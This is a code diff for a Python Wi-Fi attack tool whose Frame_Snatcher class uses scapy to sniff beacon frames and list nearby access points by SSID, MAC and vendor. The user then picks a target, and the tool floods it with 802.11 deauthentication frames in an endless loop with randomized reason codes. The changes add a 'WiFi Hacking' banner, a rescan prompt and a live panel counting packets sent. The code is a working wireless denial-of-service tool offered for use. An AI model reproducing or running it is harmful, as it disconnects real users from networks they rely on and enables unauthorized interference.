@@ -2,7 +2,8 @@
 
 
 # UI IMPORTS
-import pywifi.iface
+import pyfiglet
+import pyfiglet.fonts
 from rich.panel import Panel
 from rich.table import Table
 from rich.live import Live
@@ -54,6 +55,60 @@ class Frame_Snatcher():
         pass
 
 
+    
+    @staticmethod
+    def welcome_ui(text="    WiFi \nHacking", font="dos_rebel", c1="bold red", c2="bold purple", skip=False):
+        """This method will house the welcome message"""
+
+
+        # SET THE MODE
+        mode = 1
+
+
+
+        if mode == 1:
+
+
+            # CREATE THE VAR
+            welcome = pyfiglet.figlet_format(text=text, font=font)
+            
+            print('\n\n')
+            console.print(welcome, style=c2)
+            if skip == False:
+                console.input("[bold red]Press ENTER to Sniff! ")
+            print('\n\n\n')
+
+
+        
+
+        elif mode == 2:
+
+            fonts = pyfiglet.FigletFont.getFonts()
+
+
+            for f in fonts:
+
+                welcome = pyfiglet.figlet_format(text=text, font=f)
+
+                console.print(welcome, style=c2)
+
+                console.print(f"[bold blue]Current Font:[bold green] {f}\n\n")
+                
+
+                if f == "dos_rebel":
+                    t = 3
+                
+                else:
+
+                    t = 0.3
+
+
+
+                time.sleep(t)
+
+
+
+
     @classmethod
     def sniff_for_targets(cls, iface="wlan0", verbose=1, timeout=15):
         """This method will be used to sniff out mac addresses using the sniff function"""
@@ -63,23 +118,36 @@ class Frame_Snatcher():
 
 
         # LOOP THAT BITCH
-        while True:
-
-            
-            # OUTPUT ATTEMPT
-            console.print(f"Sniff Attempt #{tempt}", style="bold green")
+        try:
+            while True:
 
                 
-            # SNIFF THAT BITCH
-            sniff(iface=iface, prn=Frame_Snatcher.packet_parser, count=0, store=0, timeout=15)
-            
-            # APPEND TEMPT
-            tempt += 1
+                # OUTPUT ATTEMPT
+                console.print(f"Sniff Attempt #{tempt}", style="bold green")
 
+                    
+                # SNIFF THAT BITCH
+                sniff(iface=iface, prn=Frame_Snatcher.packet_parser, count=0, store=0, timeout=15)
+                
+                # APPEND TEMPT
+                tempt += 1
+
+                
+                # KEEP LOOPING UNTIL TRUE
+                if cls.beacons:
+                    break
+        
+
+        except Exception as e:
+            console.print(f"[bold red]\n\nException Error:[yellow] {e}")
+
+            console.input("[bold green]\nPress enter to return the the Main Menu: ")
+
+
+            # RETURN TO MAIN MODULE
+            from nsm_ui import MainUI
+            MainUI.main()
             
-            # KEEP LOOPING UNTIL TRUE
-            if cls.beacons:
-                break
             
 
     
@@ -102,19 +170,34 @@ class Frame_Snatcher():
         # THIS IS STRICTLY USED TO CAPTURE BEACON FRAMES // SENT FROM AP'S
         if pkt.haslayer(Dot11Beacon):
 
+            
+            # SET VARS
+            addr1 = str(pkt[Dot11].addr1) if pkt[Dot11].addr1 != "ff:ff:ff:ff:ff:ff" else "No"
+            addr2 = str(pkt[Dot11].addr2) if pkt[Dot11].addr2 != "ff:ff:ff:ff:ff:ff" else "No"
 
-            addr1 = pkt[Dot11].addr1 if pkt[Dot11].addr1 != "ff:ff:ff:ff:ff:ff" else "No"
-            addr2 = pkt[Dot11].addr2 if pkt[Dot11].addr2 != "ff:ff:ff:ff:ff:ff" else "No"
+
+            # GET SSID
+            ssid = pkt[Dot11Elt].info.decode(errors="ignore")
+
+            # GET VENDOR
+            vendor = Utilities.get_vendor(mac=addr2)
+
+            if vendor:
+                text = f"Vendor: {vendor}"
+            
+            else:
+                text = ""
+
 
 
              
 
-            if addr1 not in cls.beacons and addr1 != "No":
+            if addr1 not in cls.macs and addr1 != "No":
                 
 
                 # ADD MAC
-                #cls.beacons[cls.num] = str(addr2)
-                cls.beacons.append(addr2)
+                cls.beacons.append((ssid, addr1, vendor))
+                cls.macs.append(addr1)
                 cls.num += 1
 
 
@@ -124,28 +207,18 @@ class Frame_Snatcher():
 
 
             # BEACON == AP FRAMES ONLY           
-            if addr2 not in cls.beacons and addr2 != "No":
+            if addr2 not in cls.macs and addr2 != "No":
 
 
                 # ADD MAC
-                #cls.beacons[cls.num] = str(addr2)
-                cls.beacons.append(addr2)
+                cls.beacons.append((ssid, addr2, vendor))
+                cls.macs.append(addr2)
                 cls.num += 1
-
-
-                # GET VENDOR
-                vendor = Utilities.get_vendor(mac=addr2)
-
-                if vendor:
-                    text = f"Vendor: {vendor}"
-                
-                else:
-                    text = ""
 
 
 
                 # NOW TO OUTPUT RESULTS
-                console.print(f"[{c2}][+] Found MAC addr:[{c4}] {addr2}  {text}")
+                console.print(f"[{c2}][+] Found MAC addr:[{c4}] {addr2}")
 
 
 
@@ -162,25 +235,27 @@ class Frame_Snatcher():
 
 
         # CREATE A TABLE AND OUTPUT IT
-        table = Table(title="Targets", style="bold purple", border_style="bold red")
+        table = Table(title="Targets", style="bold purple", border_style="bold red", title_style="bold purple", header_style="bold purple")
         table.add_column("Key", style="bold red")
+        table.add_column("SSID", style="bold blue")
         table.add_column("MAC Addr", style="bold green")
+        table.add_column("Vendor", style="yellow")
         
 
 
         # LOOP THROUGH RESULTS
-        for mac in cls.beacons:
+        for var in cls.beacons:
 
 
             # APPEND NUMBER
             num +=1 
 
             # ADD TO DICT
-            data[num] = mac
+            data[num] = var[1]
 
 
             # ADD TO TABLE
-            table.add_row(f"{num}", f"{mac}")
+            table.add_row(f"{num}", f"{var[0]}",  f"{var[1]}", f"{var[2]}")
             
         
 
@@ -194,7 +269,41 @@ class Frame_Snatcher():
         print('\n')
 
 
+
+        @staticmethod
+        def rescan_option():
+            """This function will be used to ask to user weather or not they want to do another scan or continue with the results"""
         
+ 
+            
+            # USER INPUT
+            choice = console.input("[bold red]Do you want to rescan?[bold green] (y/n): ").strip().lower()
+
+
+            if choice in [1, "yes", "y", "go", "yea"]:
+
+                
+                
+                # RETURN TO MODULE MAIN METHOD
+                Utilities.clear_screen()
+                Frame_Snatcher.main(skip=True)
+
+
+            elif choice in [0, "no", "n", "nope", "nah"]:
+
+                return False
+
+            
+            else:
+
+                return False
+        
+        
+
+        # ASK THE USER IF THEY WANT TO RESCAN
+        rescan_option()
+
+
         
         # DESTROY ERRORS
         while True:
@@ -219,7 +328,7 @@ class Frame_Snatcher():
                     target = data[choice]
 
 
-                    console.print(f"\n\n[bold red]Target choosen:[yellow] {target}")
+                    console.print(f"\n[bold red]Target choosen:[yellow] {target}")
 
                     
                     # RETURN THE TARGET
@@ -278,15 +387,15 @@ class Frame_Snatcher():
                     console.print("Alright ur done for", style="bold red")
                     break
 
-    
-    
+       
 
     @classmethod
-    def target_attacker(cls, target, client="ff:ff:ff:ff:ff:ff", verbose=True, iface="wlan0", inter=0.1, count=25):
+    def target_attacker(cls, target, client="ff:ff:ff:ff:ff:ff", verbose=1, iface="wlan0", inter=0.1, count=25):
         """This method will be responsible for attacking the choosen target"""
 
 
-        # COUNT THE AMOUNT OF ERRORS
+        # VARS
+        packets_sent = 0
         error = 0
 
         
@@ -299,51 +408,85 @@ class Frame_Snatcher():
 
         time.sleep(2)
 
+
+
+        # CREATE LIVE PANEL
+        down = 5
+        panel = Panel(renderable=f"Launching Attack in {down}", style="bold purple", border_style="bold red", expand=False, title="Attack Status")
+
+
+
+
         # LOOP UNTIL CTRL + C
-        while True:
-            try:
+        with Live(panel, console=console, refresh_per_second=1):
 
 
+            # UPDATE RENDERABLE THIS IS THE COUNTDOWN UNTIL START
+            while down > 0:
                 
-                # GET REASON FOR BEING KICKED OFF / CHOOSE DIFFERENT ONES IN CASE SOME WORK BETTER THEN OTHERS
-                reasons = random.choice([4,5,7,15])
+                # OUTPUT N UPDATE
+                panel.renderable = f"Launching Attack in: {down}"
+                down -= 1
+                
+                # NOW FOR THE ACTUAL DELAY LOL
+                time.sleep(1)
 
-                # CREATE THE LAYER 2 FRAME
-                frame = RadioTap() / Dot11(addr1=client, addr2=target, addr3=target) / Dot11Deauth(reason=reasons)
+            
+            # NOW FOR THE ATTACK
+            while True:
+                try:
 
 
-                # NOW TO SEND THE FRAME
-                sendp(frame, iface=iface, inter=inter, count=count, verbose=verbose)
-        
+                    
+                    # GET REASON FOR BEING KICKED OFF / CHOOSE DIFFERENT ONES IN CASE SOME WORK BETTER THEN OTHERS
+                    reasons = random.choice([4,5,7,15])
+
+                    # CREATE THE LAYER 2 FRAME
+                    frame = RadioTap() / Dot11(addr1=client, addr2=target, addr3=target) / Dot11Deauth(reason=reasons)
 
 
-            except KeyboardInterrupt as e:
-                console.print(e)
+                    # NOW TO SEND THE FRAME
+                    sendp(frame, iface=iface, inter=inter, count=count, verbose=verbose)
 
-                break
+
+                    # UPDATE VAR & PANEL
+                    packets_sent += count
+
+                    # COLORS
+                    c1 = "bold red"
+
+                    panel.renderable = f"[{c1}]Target:[/{c1}] {target}  -  [{c1}]Total Packets Sent:[/{c1}] {packets_sent}  -  [{c1}]Reason:[/{c1}] {reasons}"
+                    
             
 
-            except Exception as e:
-                console.print(f"[bold red]Exception Error:[yellow] {e}")
 
+                except KeyboardInterrupt as e:
+                    console.print(e)
 
-                if error < 4:
-                    error += 1
-                
-                else:
-                    
-                    console.print("[bold red]Max Amount of Errors Given!")
                     break
                 
 
+                except Exception as e:
+                    console.print(f"[bold red]Exception Error:[yellow] {e}")
 
 
-
-
+                    if error < 4:
+                        error += 1
+                    
+                    else:
+                        
+                        console.print("[bold red]Max Amount of Errors Given!")
+                        break
+                    
     
+
     @classmethod
-    def main(cls):
+    def main(cls, skip=False):
         """This is where the module will spawn from"""
+
+
+        # CLEAR SCREEN
+        Utilities.clear_screen()
 
 
         # CLEAN VARS
@@ -352,8 +495,16 @@ class Frame_Snatcher():
         cls.num = 1
 
         
+        # GET GLOBAL IFACE
+        iface = "wlan1"
+
+
+        # PRINT WELCOME UI
+        Frame_Snatcher.welcome_ui(skip=skip)
+
+        
         # SNIFF FOR TARGETS
-        Frame_Snatcher.sniff_for_targets()
+        Frame_Snatcher.sniff_for_targets(iface=iface)
 
 
         # ALLOW THE USER TO CHOOSE THERE TARGET
@@ -361,7 +512,7 @@ class Frame_Snatcher():
 
 
         # NOW TO ATTACK THE TARGET
-        Frame_Snatcher.target_attacker(target=target)      
+        Frame_Snatcher.target_attacker(target=target, iface=iface)      
 
 
 
